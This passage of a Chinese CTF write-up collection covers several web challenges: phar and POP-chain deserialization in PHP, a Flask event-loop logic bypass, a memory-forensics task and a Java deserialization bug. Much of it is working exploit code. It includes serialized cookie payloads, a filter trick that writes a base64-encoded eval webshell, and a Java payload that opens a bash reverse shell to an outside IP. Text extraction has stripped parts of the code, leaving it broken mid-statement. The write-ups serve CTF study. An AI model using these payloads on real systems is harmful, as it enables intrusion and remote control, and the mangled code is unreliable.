利用phar作为攻击载荷 filepath = $filepath; $this->filename = $filename; } } class Profile{ public $username; public $password; public $admin; } $a = new File(\"eki\",\"eki\"); $a->checker = new Profile(); $a->checker->username = \"/var/www/html/sandbox/9f564a2cb832bd31431a6707104641ad/.htaccess\"; $a->checker->password = ZipArchive::OVERWRITE | ZipArchive::CREATE; $a->checker->admin = new ZipArchive(); //echo serialize($a); $phar = new Phar(\"exp.phar\"); $phar->startBuffering(); $phar->setStub(\"\"); //设置stub $phar->setMetadata($a); $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 $phar->stopBuffering(); ?> 利用filter绕过对phar的过滤 payload:/view.php?filename=2fa0baf1c751e2e9645ea67da0792644.phar&filepath=php://filter/resource=phar://./sandbox/9f564a2cb832bd31431a6707104641ad/2fa0baf1c751e2e9645ea67da0792644.phar 成功调用后应该就能成功访问正常解析的php了 getshell完成 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/qiangwangbei-2019.html":{"url":"buuoj/qiangwangbei-2019.html","title":"强网杯 2019","keywords":"","body":"强网杯 20190x01 Upload强网杯 2019 0x01 Upload 进去一个登陆界面，可以注册，登录后就可以上传图片，但是不能重复上传。。。。 没啥头绪，扫一下目录www.zip发现有源码泄露 用ThinkPHP写的，甚至还有.idea 用PHPstorm打开，发现有两个断点，一个是 public function login_check(){ $profile=cookie('user'); if(!empty($profile)){ $this->profile=unserialize(base64_decode($profile)); $this->profile_db=db('user')->where(\"ID\",intval($this->profile['ID']))->find(); if(array_diff($this->profile_db,$this->profile)==null){ return 1; }else{ return 0; } } } 反序列，一个是调用index() public function __destruct() { if(!$this->registed){ $this->checker->index(); } } 但似乎莫啥用，还是看，因为这个pop链似乎不能回显东西。。。。 既然是到上传题，还是考虑能不能注个图片马，但是这里后缀被限死了，只能.png 找一找有能没有重命名的地方 //Profile public function login_check(){ $profile=cookie('user'); if(!empty($profile)){ $this->profile=unserialize(base64_decode($profile)); $this->profile_db=db('user')->where(\"ID\",intval($this->profile['ID']))->find(); if(array_diff($this->profile_db,$this->profile)==null){ return 1; }else{ return 0; } } } public function update_cookie(){ $this->checker->profile['img']=$this->img; cookie(\"user\",base64_encode(serialize($this->checker->profile)),3600); } 可以看到这边update_cookie将profile信息存在cookie里，然后login_check的时候会反序列化，我们想能不能利用反序列化手动调用 class Profile extends Controller { public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function upload_img(){ if($this->checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; $this->ext_check(); }//无参数就能绕过前面的逻辑 if($this->ext) { if(getimagesize($this->filename_tmp)) { @copy($this->filename_tmp, $this->filename);//在此次把filename替换成的恶意filename_tmp @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img(); }else{ $this->error('Forbidden type!', url('../index')); } }else{ $this->error('Unknow file type!', url('../index')); } } } 下面构造POP链 unserialize(base64_decode($profile)); 这里可以如果是个Register反序列化触发__destruct() class Register extends Controller { public $checker; public $registed; public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } 如果这里的check是一个Profile 因为没有index方法,就会调用_call，__call到$expect触发__get class Profile extends controller { public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } } 这里设置$except为一个['index' => 'img'] ，而img赋值为upload_img,就会调用upload_img这个函数，然后在设置一下各个参数就能达到我们的改变文件名目的了 先上传一个图片马(.png) 利用下面的Exp(注意路径名，和文件名) checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; $this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)) { @copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp); $this->img=\"../upload/$this->upload_menu/$this->filename\"; $this->update_img(); }else{ $this->error('Forbidden type!', url('../index')); } }else{ $this->error('Unknow file type!', url('../index')); } } public function __get($name) { return $this->except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } } class Register { public $checker; public $registed; public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } $profile = new Profile; $profile->except = ['index' => 'img']; $profile->img = 'upload_img'; $profile->ext = \"png\"; $profile->filename_tmp =\"../public/upload/76d9f00467e5ee6abc3ca60892ef304e/57ff721cb66f51870fc723f0fd65c1de.png\"; $profile->filename =\"../public/upload/76d9f00467e5ee6abc3ca60892ef304e/57ff721cb66f51870fc723f0fd65c1de.php\"; $register = new Register; $register->checker = $profile; $register->registed = false; echo urlencode(base64_encode(serialize($register))); ?> 生成序列化对象，塞到cookie触发就可以了 TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkLzc2ZDlmMDA0NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzU3ZmY3MjFjYjY2ZjUxODcwZmM3MjNmMGZkNjVjMWRlLnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC83NmQ5ZjAwNDY3ZTVlZTZhYmMzY2E2MDg5MmVmMzA0ZS81N2ZmNzIxY2I2NmY1MTg3MGZjNzIzZjBmZDY1YzFkZS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/ddctf-2019.html":{"url":"buuoj/ddctf-2019.html","title":"DDCTF 2019","keywords":"","body":"[DDCTF 2019]homebrew event loop[DDCTF 2019] homebrew event loop 首页可以下载到源码 from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = '*********************' # censored url_prefix = '/d5afe1f66147e857' def FLAG(): return '*********************' # censored def trigger_event(event): session['log'].append(event) if len(session['log']) > 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set( 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) > 0: # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval( action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. ' resp += 'Go back to index.html' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/') def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = '' html += '[INFO] you have {} diamonds, {} points now.'.format( session['num_items'], session['points']) if page == 'index': html += 'View source code' html += 'Go to e-shop' html += 'Reset' elif page == 'shop': html += 'Buy a diamond (1 point)' elif page == 'reset': del session['num_items'] html += 'Session reset.' html += 'Go back to index.html' return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == 'True': source = open('eventLoop.py', 'r') html = '' if bool_download_source != 'True': html += 'Download this .py file' html += 'Go back to index.html' for line in source: if bool_download_source != 'True': html += line.replace('&', '&amp;').replace('\\t', '&nbsp;'*4).replace( ' ', '&nbsp;').replace('', '&gt;').replace('\\n', '') else: html += line source.close() if bool_download_source == 'True': headers = {} headers['Content-Type'] = 'text/plain' headers['Content-Disposition'] = 'attachment; filename=serve.py' return Response(html, headers=headers) else: return html else: trigger_event('action:view;index') def buy_handler(args): num_items = int(args[0]) if num_items '.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;{}'.format( num_items), 'action:view;index']) def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] ' def get_flag_handler(args): if session['num_items'] >= 5: # show_flag_function has been disabled, no worries trigger_event('func:show_flag;' + FLAG()) trigger_event('action:view;index') if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') 通过网页也可以看出这是个购买题，有趣的是当我们买钻石时 首先调用了 def buy_handler(args): num_items = int(args[0]) if num_items '.format(args[0]) session['num_items'] += num_items#此时session已经加上 trigger_event(['func:consume_point;{}'.format( num_items), 'action:view;index'])#然后调用consume_point def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 如果我们构造buy_handler()->get_flag_handler()->consume_point_function()，就能实现bypass，拿到flag def execute_event_loop(): valid_event_chars = set( 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) > 0: # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval( action + ('_handler' if is_action else '_function'))#可以看到这里有一个命令拼接点 ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. ' resp += 'Go back to index.html' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp 所以可以构造payload: action:trigger_event#;action:buy;8#action:get_flag; 利用trigger_event_handler()这个函数把两个函数拼起来 虽然后续还是会监测报错 但是根据trigger_event的log此时flag已经在session里了 session=..eJyNjk1rg0AYhP9K2XMOq8aKgpcSFKSuxGh2fUsprpsmfuxGUNNq8L9XAi2U9NDbwMw8M1fUnI_IebmiB44clFGCc2oPkYrHnAoFLHgHBg1X2yrSvUr4zYVXbSlYbZEdOWVG3HJ9_Qj6HjMduowWFppXdzgZaIek0xbrzhGN8GzJfU9FH66L5tefNqj9kE1txXVzElRrmPF0yamJoyl1_yApaIEV1pKogR1vpN-gKfdt4_slyM8TGB0memqGmxDDTpOwKfBzEtfgp32U1CMptSqcsjWZUpPQ7ZjJwP7fMFKDfCv7g-yQg1eoPZeqX6QxfwE3GHU3.XmEWdQ.mp-YDxJPoIEwXEoGxjWKW61ArgE; 下一读就是解密session 这里使用flask-session-cookie-manager 拿到 {\"log\":[{\" b\":\"YWN0aW9uOnRyaWdnZXJfZXZlbnQjO2FjdGlvbjpidXk7NSNhY3Rpb246Z2V0X2ZsYWc7\"},[{\" b\":\"YWN0aW9uOmJ1eTs1\"},{\" b\":\"YWN0aW9uOmdldF9mbGFnOw==\"}],[{\" b\":\"ZnVuYzpjb25zdW1lX3BvaW50OzU=\"},{\" b\":\"YWN0aW9uOnZpZXc7aW5kZXg=\"}],{\" b\":\"ZnVuYzpzaG93X2ZsYWc7ZmxhZ3s0N2U5MDM0ZS1mZDc0LTRkZGUtOTkyNi1jMzY4NzU5NWQyYmJ9\"},{\" b\":\"YWN0aW9uOnZpZXc7aW5kZXg=\"}],\"num_items\":0,\"points\":3} 逐个base64下找到到flag © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/eis-2019.html":{"url":"buuoj/eis-2019.html","title":"EIS 2019","keywords":"","body":"EIS 2019EzPoPEIS 2019 EzPoP /?src=1 给了源码 key = $key; $this->store = $store; $this->expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path => $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this->cleanContents($this->cache); return json_encode([$cleaned, $this->complete]); } public function save() { $contents = $this->getForStorage(); $this->store->set($this->key, $contents, $this->expire); } public function __destruct() { if (!$this->autosave) { $this->save(); } } } class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { return $this->options['prefix'] . $name; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this->options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this->writeTimes++; if (is_null($expire)) { $expire = $this->options['expire']; } $expire = $this->getExpireTime($expire); $filename = $this->getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } $data = $this->serialize($value); if ($this->options['data_compress'] && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = \"\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) { return $filename; } return null; } } if (isset($_GET['src'])) { highlight_file(__FILE__); } $dir = \"uploads/\"; if (!is_dir($dir)) { mkdir($dir); } unserialize($_GET[\"data\"]); 很显然又是要构造pop链 切入点是class A的destruct class A{ public function save() { $contents = $this->getForStorage(); $this->store->set($this->key, $contents, $this->expire); } public function __destruct() { if (!$this->autosave) { $this->save(); } } } 可以看到这部分最终调用了一个set 显然要利用到class B的set class B{ public function set($name, $value, $expire = null): bool{ $this->writeTimes++; if (is_null($expire)) { $expire = $this->options['expire']; } $expire = $this->getExpireTime($expire); $filename = $this->getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } $data = $this->serialize($value); if ($this->options['data_compress'] && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = \"\\n\" . $data; //可以看到这里有脚本拼接，但是莫得用，因为最后调用了一个exit() $result = file_put_contents($filename, $data); if ($result) { return $filename; } return null; } } 查资料发现这里有个绕过exit的方法 这里经@张师傅提醒知道有道原题叫死亡退出，并且file_put_contents是支持php伪协议的，所以我们可以通过php://filter/write=convert.base64-decode/来将 $data = \"\\n\" . $data; $result = file_put_contents(\\$filename, \\$data); 这段代码中的$data全部用base64解码转化过后再写入文件中，其中前面拼接部分会被强制解码，从而变成一堆乱码。而我们写入的shell（base64编码过的）会解码成正常的木马文件。 这里唯一需要注意的是长度问题，我们需要shell部分前面加起来的字节数为4的倍数(base64解码时不影响shell部分)。 所以$b->options['prefix']='php://filter/write=convert.base64-decode/resource=./uploads/';已经可以确定了。 ———————————————— 版权声明：本文为CSDN博主「sec_pz」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/zhangpen130/article/details/104102746 然后就是看怎么吧base64后的shell塞到$data里面了， $data = $this->serialize($value);首先是这个,只要让serialzie所指的函数不改变$value就可，这里选择strval 进一步跟踪，可以发现$data由contents里来 class A{ ... public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path => $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents;//我们希望返回一段包含shellbase64编码的contents } public function getForStorage() { $cleaned = $this->cleanContents($this->cache); return json_encode([$cleaned, $this->complete]); } public function save() { $contents = $this->getForStorage(); $this->store->set($this->key, $contents, $this->expire); } ... } 解释一下用到的几个函数 array_intersect_key() 该函数比较两个（或更多个）数组的键名，并返回一个交集数组，该数组包括了所有在被比较的数组（array1）中，同时也在任何其他参数数组（array2 或 array3 等等）中的键名。 array_flip 反转数组中的键名和对应关联的键值： 关键在于这个cache构造也即cleanContents函数中的contents foreach ($contents as $path => $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } 根据之前的$cachedProperties 这里直接构造 $object=[\"path\" =>\"\"] 其中path也可以改成$cachedProperties中的其他值 但是因为后面生成的json是带格式的，所以还要fuzz一下$path和$complete的长度 Exp: key = $key; $this->store = $store; $this->expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path => $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this->cleanContents($this->cache); return json_encode([$cleaned, $this->complete]); } public function save() { $contents = $this->getForStorage(); $this->store->set($this->key, $contents, $this->expire); } } class B { public $options; protected function getExpireTime($expire): int { return (int) $expire; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this->options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null) { $expire = $this->getExpireTime($expire); $data = $this->serialize($value); $data = \"\\n\" . $data; echo base64_decode($data); return null; } } $a = new A; $a->autosave=false; $b=new B; $b->options['expire']=233; $b->options['data_compress']=false; $b->options['prefix']=\"php://filter/write=convert.base64-decode/resource=\"; $b->options['serialize']=\"strval\"; $a->construct($b,\"233.php\"); $object=array(\"path\"=>\"PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2VraSddKTs/Pg\"); //注意如果base64后存在=要取除，因为是base编码中间的一部分 $a->cache=array(\"111\"=>$object); $a->complete=\"2\"; //echo $a->save();检验是否能解码成功 echo urlencode(serialize($a)); 有个加强版(2020红包题)是修改了 public function getCacheKey(string $name): string { // 使缓存文件名随机 $cache_filename = $this->options['prefix'] . uniqid() . $name; if(substr($cache_filename, -strlen('.php')) === '.php') { die('?'); } return $cache_filename; } .uniqid()前缀可以可以通过增加/../前缀来绕过 后缀不能是.php可以用/.等来绕过 当然因为前缀可以绕过，还有其他方法比如user.ini .htaccess等写图片马 还有利用反引号优先级大于引号的方法，拼接绕过 json的一个poc system('{\"1\":\"`whoami`\"}'); 参见：https://www.anquanke.com/post/id/194036 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/vn-2020.html":{"url":"buuoj/vn-2020.html","title":"V&N 2020","keywords":"","body":"V&N 2020CheckinTime Travel内存取证[V&N2020 公开赛]EasySpringMVCV&N 2020 Checkin 利用RCE反弹shell访问fd恢复文件 文件操作命令 cp、mv、rm 底层原理 https://blog.csdn.net/lqt641/article/details/60607165 app@c26d248e698b:/proc/1$ ls fd ls fd ls: cannot open directory 'fd': Permission denied app@c26d248e698b:/proc/1$ cd .. cd .. app@c26d248e698b:/proc$ cd 10 cd 10 app@c26d248e698b:/proc/10$ ls fd ls fd 0 1 2 3 4 5 app@c26d248e698b:/proc/10$ cat fd/0 cat fd/0 app@c26d248e698b:/proc/10$ cat fd/3 cat fd/3 flag{5a4a0c3f-6639-4948-b0a3-bf8f51702a75} Time Travel httpproxy问题： https://www.anquanke.com/post/id/84227 添加： Proxy: 174.1.22.100:5000 会被CGI解析成HTTP_PROXY 从而能打到我们的攻击机上 if(isset($_GET['flag'])) { $client = new Client(); $response = $client->get('http://127.0.0.1:5000/api/eligible'); $content = $response->getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); } 内存取证 这个内存取证题还蛮有意思的 首先拿到mem.raw 用volatility分析 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x829af8c0 System 4 0 101 479 ------ 0 2020-02-18 19:52:20 UTC+0000 0x83c4d948 smss.exe 280 4 2 30 ------ 0 2020-02-18 19:52:20 UTC+0000 0x83cc8030 csrss.exe 376 352 9 453 0 0 2020-02-18 19:52:20 UTC+0000 0x844e4d40 wininit.exe 432 352 3 79 0 0 2020-02-18 19:52:20 UTC+0000 0x844d9608 csrss.exe 440 424 10 311 1 0 2020-02-18 19:52:20 UTC+0000 0x84d59d40 services.exe 488 432 7 209 0 0 2020-02-18 19:52:21 UTC+0000 0x8466f030 lsass.exe 520 432 7 595 0 0 2020-02-18 19:52:21 UTC+0000 0x8466f600 lsm.exe 528 432 10 146 0 0 2020-02-18 19:52:21 UTC+0000 0x8465e3b0 winlogon.exe 536 424 4 115 1 0 2020-02-18 19:52:21 UTC+0000 0x846af568 svchost.exe 668 488 10 356 0 0 2020-02-18 19:52:21 UTC+0000 0x846c0728 svchost.exe 740 488 8 285 0 0 2020-02-18 19:52:21 UTC+0000 0x8861ead8 svchost.exe 804 488 21 467 0 0 2020-02-18 19:52:21 UTC+0000 0x846e6300 svchost.exe 860 488 23 487 0 0 2020-02-18 19:52:21 UTC+0000 0x846edb38 svchost.exe 884 488 39 988 0 0 2020-02-18 19:52:21 UTC+0000 0x847315c0 audiodg.exe 988 804 7 132 0 0 2020-02-18 19:52:21 UTC+0000 0x8475d728 svchost.exe 1060 488 15 557 0 0 2020-02-18 19:52:21 UTC+0000 0x846a4740 WUDFHost.exe 1164 860 9 202 0 0 2020-02-18 19:52:22 UTC+0000 0x847913f8 svchost.exe 1260 488 17 382 0 0 2020-02-18 19:52:22 UTC+0000 0x846a8348 spoolsv.exe 1372 488 13 300 0 0 2020-02-18 19:52:22 UTC+0000 0x84805318 svchost.exe 1432 488 20 314 0 0 2020-02-18 19:52:22 UTC+0000 0x848104a8 taskhost.exe 1480 488 10 211 1 0 2020-02-18 19:52:22 UTC+0000 0x84648560 taskeng.exe 1536 884 5 76 0 0 2020-02-18 19:52:23 UTC+0000 0x84885348 imdsksvc.exe 1720 488 3 41 0 0 2020-02-18 19:52:23 UTC+0000 0x848a3d40 coherence.exe 1760 488 6 62 0 0 2020-02-18 19:52:23 UTC+0000 0x848a8b38 prl_tools_serv 1796 488 11 160 0 0 2020-02-18 19:52:23 UTC+0000 0x848b2728 dwm.exe 1832 860 4 73 1 0 2020-02-18 19:52:23 UTC+0000 0x848c52e8 coherence.exe 1840 1760 4 40 1 0 2020-02-18 19:52:23 UTC+0000 0x848ca878 dllhost.exe 1880 488 8 97 0 0 2020-02-18 19:52:23 UTC+0000 0x848df648 prl_tools.exe 1904 1796 10 144 1 0 2020-02-18 19:52:23 UTC+0000 0x848e4578 explorer.exe 1964 1808 31 873 1 0 2020-02-18 19:52:23 UTC+0000 0x84871b10 dllhost.exe 824 488 17 204 0 0 2020-02-18 19:52:24 UTC+0000 0x8486cd40 svchost.exe 696 488 11 307 0 0 2020-02-18 19:52:24 UTC+0000 0x848b3a00 prl_cc.exe 2204 1904 32 385 1 0 2020-02-18 19:52:24 UTC+0000 0x84992d40 msdtc.exe 2536 488 15 155 0 0 2020-02-18 19:52:25 UTC+0000 0x83940728 sppsvc.exe 2792 488 4 148 0 0 2020-02-18 19:52:28 UTC+0000 0x839cab10 SearchIndexer. 2868 488 13 588 0 0 2020-02-18 19:52:30 UTC+0000 0x83c0ad40 TrueCrypt.exe 3364 3188 7 388 1 0 2020-02-18 19:52:44 UTC+0000 0x837f5d40 notepad.exe 3552 1964 2 61 1 0 2020-02-18 19:53:07 UTC+0000 0x82a7e568 iexplore.exe 3640 1964 16 468 1 0 2020-02-18 19:53:29 UTC+0000 0x847c8030 iexplore.exe 3696 3640 25 610 1 0 2020-02-18 19:53:29 UTC+0000 0x848a7030 mspaint.exe 2648 1964 18 383 1 0 2020-02-18 19:54:01 UTC+0000 0x82b8bd40 svchost.exe 1660 488 7 112 0 0 2020-02-18 19:54:01 UTC+0000 0x83bf0030 mscorsvw.exe 2908 488 7 75 0 0 2020-02-18 19:54:24 UTC+0000 0x82bf4d40 dllhost.exe 628 668 6 86 1 0 2020-02-18 19:56:22 UTC+0000 0x82bf4768 dllhost.exe 1728 668 6 81 0 0 2020-02-18 19:56:22 UTC+0000 0x83922030 DumpIt.exe 1500 1964 2 39 1 0 2020-02-18 19:56:22 UTC+0000 0x82bf3408 conhost.exe 1872 440 2 51 1 0 2020-02-18 19:56:22 UTC+0000 0x82b85b40 WMIADAP.exe 1120 884 6 91 0 0 2020-02-18 19:56:23 UTC+0000 0x82a9fb38 WmiPrvSE.exe 684 668 8 119 0 0 2020-02-18 19:56:24 UTC+0000 有个mspaint，那么一般是要dump出来用gimp等工具恢复出来里面的图像 试一下常见的宽高，然后调偏移 最后大概是这样 暂时还不知道是啥意思 看到有notepad.exe 那么试一下notepad和editbox editbox返回 Volatility Foundation Volatility Framework 2.6 ****************************** Wnd Context : 1\\WinSta0\\Default Process ID : 3640 ImageFileName : iexplore.exe IsWow64 : No atom_class : 6.0.7600.16385!Edit value-of WndExtra : 0x4a13b8 nChars : 0 selStart : 0 selEnd : 0 isPwdControl : False undoPos : 0 undoLen : 0 address-of undoBuf: 0x0 undoBuf : ------------------------- ****************************** Wnd Context : 1\\WinSta0\\Default Process ID : 3640 ImageFileName : iexplore.exe IsWow64 : No atom_class : 6.0.7600.16385!Edit value-of WndExtra : 0x49f3d0 nChars : 60 selStart : 0 selEnd : 0 isPwdControl : False undoPos : 0 undoLen : 0 address-of undoBuf: 0x0 undoBuf : ------------------------- https://pan.baidu.com/share/init?surl=jAVwrRzIgW1QsLHidtzY_w ****************************** Wnd Context : 1\\WinSta0\\Default Process ID : 3552 ImageFileName : notepad.exe IsWow64 : No atom_class : 6.0.7600.16385!Edit value-of WndExtra : 0x177ad0 nChars : 78 selStart : 0 selEnd : 0 isPwdControl : False undoPos : 0 undoLen : 0 address-of undoBuf: 0x0 undoBuf : ------------------------- where is link?链接: https://pan.baidu.com/s/ 提取码: heem 复制这段内容后打开百度网盘手机App，操作更方便哦 有个度盘链接和验证码 但是复现的时候貌似么法打开了。。。。。 有iexplore.exe，可以用iehistory或者yarascan搞一下也能看到链接地址 接下来似乎是拿到TrueCrypt的密码，去解开链接下载的东西，然后一个压缩包，密码就是画图里dump出来的了 [V&N2020 公开赛]EasySpringMVC 看了一下以为要绕鉴权 结果ReadObject里有个奇怪的操作 private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } 这边反序列的时候说的时候把obj调用进(new ProcessBuilder((String[])obj)).start();里了 相当于可以直接RCE了 obj是从in.readObject();里面来的，查文档可以发现，in.readObject();是我们序列化时out.writeObject写入的 那就来生成一个 /* */ package com.tools; /* */ import java.io.*; /* */ /* */ /* */ /* */ public class Tools implements Serializable { /* */ private static final long serialVersionUID = 1L; /* */ /* */ public static Object parse(byte[] bytes) throws Exception { /* 10 */ ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); /* 11 */ return ois.readObject(); /* */ } /* */ private String testCall; /* */ public static byte[] create(Object obj) throws Exception { /* 15 */ ByteArrayOutputStream bos = new ByteArrayOutputStream(); /* 16 */ ObjectOutputStream outputStream = new ObjectOutputStream(bos); /* 17 */ outputStream.writeObject(obj); /* 18 */ return bos.toByteArray(); /* */ } /* */ /* */ private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { /* 22 */ Object obj = in.readObject(); /* 23 */ (new ProcessBuilder((String[])obj)).start(); /* */ } private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException{ String command[]={\"bash\",\"-c\",\"bash -i>& /dev/tcp/172.16.138.142/2333 0>&1\"};//执行命令 反弹Shell out.writeObject(command); } /* */ } /* Location: C:\\Users\\Eki\\Desktop\\springmvcdemo_2\\WEB-INF\\classes\\!\\com\\tools\\Tools.class * Java compiler version: 8 (52.0) * JD-Core Version: 1.0.7 */ package com.company; import java.util.Base64; import com.tools.*; public class Main { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e){ e.printStackTrace(); } } } 运行后将生成的payload放进cookie里就会触发了 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 